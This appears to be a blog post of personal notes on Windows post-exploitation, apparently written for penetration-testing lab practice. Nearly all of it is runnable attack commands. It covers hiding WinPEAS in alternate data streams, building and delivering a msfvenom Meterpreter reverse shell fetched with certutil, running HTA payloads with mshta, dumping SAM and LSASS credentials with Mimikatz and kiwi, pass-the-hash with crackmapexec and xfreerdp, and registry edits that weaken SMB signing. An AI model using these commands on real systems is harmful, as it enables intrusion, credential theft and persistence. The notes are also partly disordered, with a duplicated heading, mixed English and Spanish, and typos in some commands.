---
title: 'Windows Stuff'
description: ''
pubDate: 'Jul 03 2022'
heroImage: '/post-exploitation.jpg'
---

# Alternate Data Streams (ADS)

## Information

- ADS is and NTFS (Net Tech File System) file attribute, designed to provice compatibility with the MacOS HFS (Hierarchical File System).

- File created on an NTFS formatted drive will have:

  - **Data Stream:** Contains data of the file.
  - **Resource stream:** Contains the metadata of the file.

- Attackers can use ADS to hide code in the file attribute resource stream (metadata).

```bash
# command prompt
# EXAMPLE:
notepad text.txt

# Creating hidden data in Resource stream
test.txt:secret.txt

# Convert winpeas into a Resource stream
type winpeas_filename.exe > windows_log.txt:winpeas.exe

start winpeas_filename.txt:winpeas.exe
# [!] There is no program associated to perform the requested action.

# Creating sym link to resolve ERROR, Each time we execute wupdate will execute winpeas
cd C:\Windows\System32
mklink wupdate.exe C:\Temp\winpeas_filename.txt:winpeas.exe
wupdate\n
```

# Alternate Data Streams (ADS)

## Information

- The windows OS stores hashed user account passwords locally in the SAM (Security Accounts Manager) database.

- The auth and verification of user creds is facilitated by the Local Security Authority(LSA).

- Version up to win server 2003 utilize two different types of hashes
  - - LM (LanMan)
  - - NTLM

### SAM

- SAM is a db file that is responsable for maning user acc and passwords on Windows.

- SAM cannot be copied while OS is running, attackers utilize in-memory techniques and tools to dump SAM hashes from the LSASS process.

- In modern versions of Windows, SAM db is encrypted with a syskey.

### LM (LanMan)

- The protocol is used to hash user pass, and the hashing process can be broken down into:
  - - The pass is broken into two seven-character chunk.
  - - All characters are then converted into UPPERCASE.
  - - Each chunk is then hashed separately with the DES algorithm.

### NTLM (NTHash)

- Is a collection of auth protocols that are utilized in windows to facilitate auth between computers. Involves creds to successfully auth.

- Windows disables LM hashing and utilizes NTLM hashing

- Allows the use of symbols and unicode chars.

```bash
C:\Windows\Panther\Unattend.xml

C:\Windows\Panther\Autounattend.xml
```

### Searching Passwords in config file

Kali - bash

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=kali_ip LPORT=1234 -f exe > payload.exe

python -m http.server 80
# GET PAYLOAD
# File already transfer

# Before exec create a meterpreter session

msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST target
set LPORT 1234
run # Listeting

#meterpreter session after execute payload
sysinfo
cd C:\Windows\Panther
download unattend.xml

# bash, This file contains configurations windows instalation
# Scroll to find password, username
cat unattend.xml

```

Target - windows

```bash
# Listener
python -m SimpleHTTPServer 80

# GET
certutil -urlcache -f http://ip/payload.exe payload.exe

# Before exec create a meterpreter session
#Double click on payload and get a meterpreter session

```

In a windows

```shell
powershell -ep bypass
. .\PowerUp.ps1
Invoke-PrivescAudit
cat C:\Windows\Panther\Unattend.xml

## base64 decode
$password='QWRtaW5AMTIz'
$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pa
ssword))
echo $password

# Exec a command root
runas.exe /user:administrator cmd
$password
whoami
administrator
```

Kali

```bash
msfconsole -q
use exploit/windows/misc/hta_server
exploit
```

Windows

```bash
mshta.exe url_generated_by_server.hta
#flag
```

# Dumping hashes with Mimikatz

- It allows for the extraction of clear-text passwords, hashes and kerberos tickets from memory.

- Can be usedto extract hashes from the lsass.exe process memory where hashes are cached.

- We can utilize meterpreter extension kiwi

```bash
# meterpreter session
sysinfo
getuid
pgrep lsass
migrate id
getuid
# loAd kiwi
load kiwi
? # help command
creds_all
lsa_dump_sam
lsa_dump_secrets

# MimiKatz
cd C:\\Temp
upload /usr/share/windows-resources/mimikatz.exe

shell
C:\Temp> .\mimikatz.exe

privilege::debug # 20 can extract hash information
lsadump::sam # RID (500) means admin user # Extract NTLM hashes via the LSA
lsadump::secrets
sekurlsa::logonpasswords
```

# Pass The Hash Attacks

Is an exploitation technique that involves capturing | harvesting NTLM hashes | Clear-text passwords and utilizing them to auth with the target legitimately.

- We can use multiple tools to facilitate a Pass-The-Hash attack:
  - Metasploit PsExec module
  - Crackmapexec
  - evil-WinRM

Si usamos el modulo **psexec** de una session donde nuestro usuario esta en el grupo Administrador pero no es administrador, y tenemos STATUS_ACCESS_DENIED (Command=117 WordCount=0) error, es un indicativo bueno para cambiar los registros podria ser requerido para un ataque exitoso.

```bash
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System añadir un nuevo DWORD (32-bit) nombrado LocalAccountTokenFilterPolicy y setearlo a 1

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters añadir un nuevo DWORD (32-bit) nombrado RequireSecuritySignature y setearlo a 0

```

O usando comandos de powershell

<img src="https://res.cloudinary.com/djc1umong/image/upload/v1688609440/Screenshot_from_2023-07-05_22-10-05_xavizf.png">

<img src="https://res.cloudinary.com/djc1umong/image/upload/v1688609503/Screenshot_from_2023-07-05_22-11-21_xugvfi.webp">

```bash
xfreerdp /u:admin /d:foocorp /pth: NTLM_HASH /v:ip

# admin
hash NTLM: as0d123d8f39asd96f8a7d

# student
hash NTLM: a8sda896f80adg6a81092j

# meterpreter sesion
hashdump
# this has for pasexec #set SMBPass
# Getting sessios as admin
set target Command
# set target Native\ upload
exploit

sysinfo # Adminitrator
```

with crackmapexec

```bash
crackmapexec smb target -u Administrator -H "NTLM hash"
#123124 (Pwn3d!)

crackmapexec smb target -u Administrator -H "NTLM hash" -x "ipconfig"

```

### What to do after exploitation? Enumerating System

```bash

# getuid, getprivs, whoami /priv
# query user => actual sessions online
# net users => list users
# net user administrator # net user guest
# net localgroup => list groups
## checkout "Remote Desktop Users" => Can login via RDP
# net localgroup administrators => what user are admin !important

# search for security updates
wmic qfe get Caption, Description, HotFixID, InstalledOn

# We can verify if C:\\Windows\System32\eula.txt , provied information

```

### Enumerating Network

```bash
# ipconfig /all
# route print
# arp -a -> list all devices on the network

# netstat -ano -> list services running
# netsh firewall show state
# net sh advfirewall show state
# netsh advfirewall

```

### Enumerating Processes & Services

```bash

# net star -> servicion on the background
# wmic service list brief -> List running seervices
# tasklist /SVC -> important! process and service attached
# schtasks /query /fo LIST /v -> list of cron tasks

# Automatic ENUMERATION jaws-enum.ps1#

```
